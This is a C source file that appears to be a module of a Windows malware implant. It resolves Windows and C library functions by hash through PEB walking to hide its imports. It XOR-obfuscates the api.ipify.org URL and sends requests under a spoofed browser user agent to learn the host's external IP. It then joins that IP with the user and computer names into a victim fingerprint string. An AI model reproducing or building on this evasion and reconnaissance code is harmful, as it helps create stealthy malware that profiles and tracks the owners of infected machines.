#include "commun.h"
#include "crypto.h"
#include "getaddress.h"


#define STRLEN(s) ({ \
    const char* _p = (s); \
    size_t _len = 0; \
    while (*_p++) { \
        _len++; \
    } \
    _len; \
})

#define UNLEN 256


#define InternetOpenW_h 0x53a601f1
#define InternetOpenUrlA_h 0x7af762ae
#define InternetReadFile_h 0xe6ea4da4
#define InternetCloseHandle_h 0x2854d3aa


#define malloc_h 0xfff88bb7
#define strncpy_h 0xf9a6edf2
#define strcpy_h 0xf527544
#define strlen_h 0xf529a17


#define GetComputerNameA_h 0x95fe7eb0
#define GetUserNameA_h 0xd4f1fd40


typedef LPVOID HINTERNET;
typedef HINTERNET* LPHINTERNET;


typedef HINTERNET (WINAPI* InternetOpenW_t)(
    LPCWSTR lpszAgent,
    DWORD   dwAccessType,
    LPCWSTR lpszProxy,
    LPCWSTR lpszProxyBypass,
    DWORD   dwFlags
);

typedef HINTERNET (WINAPI* InternetOpenUrlA_t)(
    HINTERNET hInternet,
    LPCSTR    lpszUrl,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    DWORD     dwFlags,
    DWORD_PTR dwContext
);

typedef BOOL (WINAPI* InternetReadFile_t)(
    HINTERNET hFile,
    LPVOID    lpBuffer,
    DWORD     dwNumberOfBytesToRead,
    LPDWORD   lpdwNumberOfBytesRead
);


typedef void* (WINAPI* malloc_t)(
    size_t size
);

typedef char* (WINAPI* strncpy_t)(
    char* strDest,
    const char* strSource,
    size_t count
);

typedef BOOL (WINAPI* InternetCloseHandle_t)(
    HINTERNET hInternet
);

typedef BOOL (WINAPI* GetComputerNameA_t)(
    LPSTR   lpBuffer,
    LPDWORD nSize
);


typedef char* (WINAPI* strcpy_t)(
    char* strDestination,
    const char* strSource
);

typedef BOOL (WINAPI* GetUserNameA_t)(
    LPSTR   lpBuffer,
    LPDWORD pcbBuffer
);

typedef size_t (WINAPI* strlen_t)(
    const char* str
);


char* get_external_ip() {

    HINTERNET hInternet, hConnect;
    char* buffer = NULL;

    InternetOpenW_t InternetOpenWFunc = (InternetOpenW_t)PEBGetAddr(InternetOpenW_h);
    InternetOpenUrlA_t InternetOpenUrlAFunc = (InternetOpenUrlA_t)PEBGetAddr(InternetOpenUrlA_h);
    InternetReadFile_t InternetReadFileFunc = (InternetReadFile_t)PEBGetAddr(InternetReadFile_h);
    InternetCloseHandle_t InternetCloseHandleFunc = (InternetCloseHandle_t)PEBGetAddr(InternetCloseHandle_h);

    malloc_t mallocFunc = (malloc_t)PEBGetAddr(malloc_h);
    strncpy_t strncpyFunc = (strncpy_t)PEBGetAddr(strncpy_h);


    hInternet = InternetOpenWFunc(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 1, NULL, NULL, 0);
    if (hInternet) {

        // xor(http://api.ipify.org)
        char getapi[] = { 0xc2, 0xde, 0xde, 0xda, 0x90, 0x85, 0x85, 0xcb, 0xda, 0xc3, 0x84, 0xc3, 0xda, 0xc3, 0xcc, 0xd3, 0x84, 0xc5, 0xd8, 0xcd, 0xaa };
        xor_aa_byte(getapi, sizeof(getapi));
        hConnect = InternetOpenUrlAFunc(hInternet, getapi, NULL, 0, 0x80000000, 0);
        xor_aa_byte(getapi, sizeof(getapi));
        if (hConnect) {
            char tempBuffer[32] = { 0 };  // Temporary buffer
            DWORD bytesRead = 0;

            if (InternetReadFileFunc(hConnect, tempBuffer, sizeof(tempBuffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer = (char*)mallocFunc(bytesRead + 1);
                if (buffer) {
                    strncpyFunc(buffer, tempBuffer, bytesRead);
                    buffer[bytesRead] = '\0';  // Null-terminate the string
                }
            }

            InternetCloseHandleFunc(hConnect);
        }
        InternetCloseHandleFunc(hInternet);
    }

    return buffer;
}



char* get_metadata() {
    char computerName[15 + 1];
    DWORD computerNameLen = sizeof(computerName) / sizeof(computerName[0]);

    char userName[UNLEN + 1];
    DWORD userNameLen = sizeof(userName) / sizeof(userName[0]);

    GetComputerNameA_t GetComputerNameAFunc = (GetComputerNameA_t)PEBGetAddr(GetComputerNameA_h);
    strcpy_t strcpyFunc = (strcpy_t)PEBGetAddr(strcpy_h);
    GetUserNameA_t GetUserNameAFunc = (GetUserNameA_t)PEBGetAddr(GetUserNameA_h);
    malloc_t mallocFunc = (malloc_t)PEBGetAddr(malloc_h);
    strlen_t strlenFunc = (strlen_t)PEBGetAddr(strlen_h);

    if (!GetComputerNameAFunc(computerName, &computerNameLen)) {
        strcpyFunc(computerName, "UnknownComputer");
    }
    if (!GetUserNameAFunc(userName, &userNameLen)) {
        strcpyFunc(userName, "UnknownUser");
    }

    char* externalIP = get_external_ip();
    if (!externalIP) {
        externalIP = (char*)"UnknownIP";
    }
    int bufferSize = strlenFunc(externalIP) + strlenFunc(computerName) + strlenFunc(userName) + 3;  // for the underscores and null terminator
    char* result = (char*)mallocFunc(bufferSize);
    if (!result) {
        return NULL;  // Memory allocation failed
    }
    snprintf(result, bufferSize, "%s_%s_%s", externalIP, userName, computerName);
    return result;
}
